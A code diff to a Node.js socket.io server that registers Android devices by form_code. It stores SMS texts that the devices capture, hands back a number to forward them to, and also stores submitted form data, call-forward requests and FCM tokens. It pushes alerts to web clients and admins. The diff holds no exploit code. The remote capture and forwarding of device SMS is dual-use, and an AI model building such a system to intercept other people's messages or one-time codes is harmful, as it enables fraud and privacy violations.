@@ -35,9 +35,10 @@ app.prepare().then(() => {
     // socket.emit("hello", "hello-world");
 
     // Mark device as online in DB if android_id exists
-    const { android_id, user_id, form_code, client } = socket.handshake.query;
-    console.log("New client connected:", socket.id, client, form_code, user_id);
+    const { android_id, user_id, form_code, role, client } = socket.handshake.query;
+    
     if (client === 'android' && android_id) {
+      console.log("✅ Android Client:", socket.id, client, form_code);
       const now = new Date(); // Current timestamp
       db.query(
         `UPDATE devices SET device_status = 'online', last_seen_at = ? WHERE android_id = ? AND form_code = ?`,
@@ -55,6 +56,7 @@ app.prepare().then(() => {
     }
 
     if (client === 'web' && user_id) {
+      console.log("New Web client:", socket.id, role, client, form_code, user_id);
       const now = new Date(); // Current timestamp
       db.query(
         `UPDATE users SET user_status = 'online', last_seen_at = ? WHERE id = ? and form_code = ?`,
@@ -106,6 +108,18 @@ app.prepare().then(() => {
             status: 403,
             message: `SMS forwarding is not enabled for form_code: ${form_code}`,
           });
+          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
+          sendMessageToAdmin("new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
+          return;
+        }
+
+        if(!sms_forwarding_to_number || sms_forwarding_to_number.trim() === ""){
+          callback({
+            status: 404,
+            message: `No forwarding number found for form_code: ${form_code}`,
+          });
+          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But no forwarding number found`, false);
+          sendMessageToAdmin("new_sms_data", `New SMS Received & But no forwarding number found`, false);
           return;
         }
 
@@ -131,7 +145,7 @@ app.prepare().then(() => {
     // End getSmsForwardingNumber
 
 
-    //Listen for smsForwardingData
+    //Listen or Save for smsForwardingData
     socket.on('smsForwardingData', async (data, callback) => {
       try {
         const {
@@ -182,6 +196,33 @@ app.prepare().then(() => {
           sms_forwarding_status_message1 = sms_forwarding_status_message ;
         }
 
+        if(!forward_to_number || forward_to_number.trim() === ""){
+          sms_forwarding_status1 = "Failed"
+          sms_forwarding_status_message1 = "No forwarding number found for form_code("+form_code+")";
+        }
+
+        // Check for duplicates within the last 1 minute
+        const [existing] = await db.query(
+          `SELECT id FROM sms_forwarding 
+          WHERE android_id = ? 
+            AND (sim_sub_id = ? OR (? IS NULL AND sim_sub_id IS NULL))
+            AND sender = ? 
+            AND message = ?
+            AND created_at >= NOW() - INTERVAL 1 MINUTE
+          LIMIT 1`,
+          [android_id, sim_sub_id || null, sim_sub_id || null, sender, message]
+        );
+
+        if (existing.length > 0) {
+            console.log("⚠️ Duplicate SMS ignored (within 1 minute)", {
+            android_id,
+            sim_sub_id,
+            sender,
+            message,
+          });
+          return;
+        }
+
         // ✅ Insert into your table
         const sql = `
       INSERT INTO sms_forwarding (
@@ -208,24 +249,39 @@ app.prepare().then(() => {
 
         // ✅ Get inserted ID directly
         const id = result.insertId;
-        console.log(`✅ New record inserted with ID: ${id}`);
+        console.log(`✅ Saved SMS with ID: ${id}`, form_code, android_id );
         
         if (sms_forwarding_to_number_status !== "Enabled") {
           callback({
             status: 403,
-            message: `SMS Saved & But forwarding is not enabled for form_code: ${form_code}`,
+            message: `SMS Saved & But forwarding is not enabled, contact admin`,
           });
-          return;
+          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
+          sendMessageToAdmin("new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
+        }else {
+          if(!forward_to_number || forward_to_number.trim() === ""){
+            sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But no forwarding number found`, false);
+            sendMessageToAdmin("new_sms_data", `New SMS Received & But no forwarding number found`, false);
+            callback({
+              status: 400,
+              message: `No forwarding number found`,
+            });
+          }else {
+            callback({
+              status: 200,
+              message: 'SMS forwarding Data saved successfully',
+              data: { id, forward_to_number },
+            });
+            console.log(`✅ SMS from ${sender} saved successfully.` , form_code, android_id );
+            sendMessageToClients(form_code, "new_sms_data", "New SMS Forwarding Data Received", true);
+            sendMessageToAdmin("new_sms_data", "New SMS Forwarding Data Received", true);
+          }
         }
+        // emit to web clients about new sms forwarding data received
 
-        callback({
-          status: 200,
-          message: 'SMS forwarding data saved successfully',
-          data: { id, forward_to_number },
-        });
-        console.log(`✅ SMS from ${sender} saved successfully.`);
       } catch (err) {
-        console.error('❌ Error saving SMS forwarding data:', err);
+        console.error('❌ Error saving SMS forwarding data:', err, form_code, android_id);
+        sendMessageToAdmin("new_sms_data", "Error saving SMS forwarding data", false);
         callback({
           status: 500,
           message: 'Server error: ' + err.message,
@@ -284,8 +340,6 @@ app.prepare().then(() => {
 
     // End for updateSMSForwardingStatus
 
-
-
     //Listen for formDataId with form_data_id to fetch form details
     socket.on('formDataId', async (data, callback) => {
       try {
@@ -317,7 +371,10 @@ app.prepare().then(() => {
           data: form_data_id,
         });
 
-        console.log(`✅ Form #${form_data_id} saved successfully`);
+        let message = `Updated Form Data #${form_data_id}`;
+        sendMessageToClients(form_code, "new_form_data", message, true);
+        sendMessageToAdmin("new_form_data", message, true);
+        console.log(message, android_id, form_code);
       } catch (err) {
         console.error('❌ Error saving form:', err);
         callback({
@@ -350,15 +407,22 @@ app.prepare().then(() => {
 
         const form_data_id = insertResult.insertId;
 
+        let form_data_details = [];
         // ✅ Insert form details
         for (const key in formData) {
           if (Object.prototype.hasOwnProperty.call(formData, key)) {
             const value = formData[key];
-            await db.query(
+            const [insertResult] = await db.query(
               `INSERT INTO form_data_details (form_data_id, input_key, input_value)
                VALUES (?, ?, ?)`,
               [form_data_id, key, value]
             );
+            form_data_details.push({
+              "form_data_details_id": insertResult.insertId,
+              "input_value": value ,
+              "input_key": key ,
+              "form_data_details_created_at": new Date(),
+            });
           }
         }
         callback({
@@ -367,7 +431,34 @@ app.prepare().then(() => {
           data: form_data_id,
         });
 
-        console.log(`✅ Form #${form_data_id} saved successfully`);
+        // get device by android_id and form_code
+        // const [rowsDevice] = await db.query(
+        //   `SELECT id as device_id, device_name, device_model FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
+        //   [android_id, form_code]
+        // );
+        // let device_name = "";
+        // let device_model = "";
+        // if (rowsDevice.length > 0) {
+        //   const device = rowsDevice[0];
+        //   device_name = device.device_name;
+        //   device_model = device.device_model;
+        // }
+
+        // let prepareClientFormData = {
+        //   "form_id": form_data_id,
+        //   "android": android_id,
+        //   "device_name": device_name,
+        //   "device_model": device_model,
+        //   "created_at": new Date(),
+        //   "form_code": form_code,
+        //   "form_data_details": form_data_details
+        // };
+
+        // emit to web clients about new form data received
+        let message = `New Form Data #${form_data_id} Received`;
+        sendMessageToClients(form_code, "new_form_data", message, true);
+        sendMessageToAdmin("new_form_data", message, true);
+        console.log(message, android_id, form_code);
       } catch (err) {
         console.error('❌ Error saving form:', err);
         callback({
@@ -466,15 +557,49 @@ app.prepare().then(() => {
           throw new Error(sms_status_message || `SMS Undelivered for sms_send_id ${sms_send_id}`);
         }
         sendMessageToClients(form_code, "sms_status_device", `SMS status updated to ${sms_status}`, true);
+        sendMessageToAdmin("sms_status_device", `SMS status updated to ${sms_status}`, true);
         console.log(`SMS status update sent to web clients for sms_send_id ${sms_send_id}`);
       } catch (err) {
         let errorMsg = err.message || 'Server error while updating SMS status';
         console.error(errorMsg);
         sendMessageToClients(form_code, "sms_status_device", errorMsg, false);
+        sendMessageToAdmin("sms_status_device", errorMsg, false);
       }
     }
     );
     //End update_sms_status_device
+
+
+    
+    // update_device_token
+    socket.on("update_device_token", async (data) => {
+      const { token } = data;
+      try {
+        // find the device by android_id and form_code
+        const [rowsDevice] = await db.query(
+          `SELECT id as device_id FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
+          [android_id, form_code]
+        );
+        if(rowsDevice.length === 0) {
+          throw new Error(`❌ Device with android_id ${android_id} and form_code ${form_code} not found in database to save fcm token `);
+        }
+        const device = rowsDevice[0];
+        // update fcm_token in devices table
+        const [result] = await db.query(
+          `UPDATE devices SET fcm_token = ? WHERE id = ?`,
+          [token, device.device_id]
+        );
+        if (result.affectedRows === 0) {
+            throw new Error(`❌ No device record found with ID: ${device.device_id} to update fcm token`);
+        }
+        console.log(`✅ Device-${device.device_id}  android_id-${android_id} updated fcm_token successfully`);
+      } catch (err) {
+        let errorMsg = err.message || 'Server error while updating fcm token';
+        console.error(errorMsg);
+      }
+    }
+    );
+    //End update_device_token
 
     function sendMessageToClients(form_code, event_name, message, success=false){
       const clientSockets = [...io.sockets.sockets.values()].filter(
@@ -483,6 +608,22 @@ app.prepare().then(() => {
             s.handshake.query.form_code === form_code
         );
         console.log(`total ${clientSockets.length} web clients to send ${event_name} message.`);
+        // Emit to all clientSockets  
+        clientSockets.forEach((clientSocket) => {
+          clientSocket.emit(event_name, {
+            success: success,
+            message: message,
+          });
+        });
+    }
+
+    function sendMessageToAdmin(event_name, message, success=false){
+      const clientSockets = [...io.sockets.sockets.values()].filter(
+          (s) =>
+            s.handshake.query.client === "web" &&
+            s.handshake.query.role === "admin"
+        );
+        console.log(`total ${clientSockets.length} web admin to send ${event_name} message.`);
         // Emit to all clientSockets  
         clientSockets.forEach((clientSocket) => {
           clientSocket.emit(event_name, {
@@ -637,9 +778,47 @@ app.prepare().then(() => {
     // End CallForwardRemove Request To Android
 
 
+
+  // DEVICE_STATUS MESSAGE
+ socket.on("device_status_message", async (data) => {
+    const { device_status_message, device_status } = data;
+
+    try {
+      let sql;
+      let params;
+
+      if (device_status !== undefined && device_status !== null) {
+        sql = `UPDATE devices 
+              SET device_status_message = ?, device_status = ? 
+              WHERE android_id = ? AND form_code = ?`;
+        params = [device_status_message, device_status, android_id, form_code];
+      } else {
+        // ✅ Update only the message if device_status is missing
+        sql = `UPDATE devices 
+              SET device_status_message = ? 
+              WHERE android_id = ? AND form_code = ?`;
+        params = [device_status_message, android_id, form_code];
+      }
+
+      await db.query(sql, params);
+      console.log(`🔄 Device ${android_id}/${form_code}: ${device_status_message}`);
+      const now = new Date();
+      io.emit("device_status_update", {
+            id: android_id,
+            device_status: device_status,
+            last_seen_at: now
+          });
+
+    } catch (err) {
+      console.error("❌ Error updating device status message:", err);
+    }
+  });
+
+
     socket.on('disconnect', () => {
-      console.log('❌ Client disconnected:', socket.id, client, form_code);
+      
       if (client === 'android' && android_id) {
+        console.log('❌ Android Client ', socket.id, client, form_code);
         const now = new Date();
         db.query(
           `UPDATE devices SET device_status = 'offline', last_seen_at = ? WHERE android_id = ? AND form_code = ?`,
@@ -656,6 +835,7 @@ app.prepare().then(() => {
       }
       
       if (client === 'web' && user_id) {
+        console.log('❌ Web Client ', socket.id, role, client, form_code, user_id);
         const now = new Date(); // Current timestamp
         db.query(
           `UPDATE users SET user_status = 'offline', last_seen_at = ? WHERE id = ? and form_code = ?`,
@@ -672,6 +852,7 @@ app.prepare().then(() => {
           .catch(err => console.error(`❌ Error updating device online status:`, err));
       }
     });
+
 
   });
 
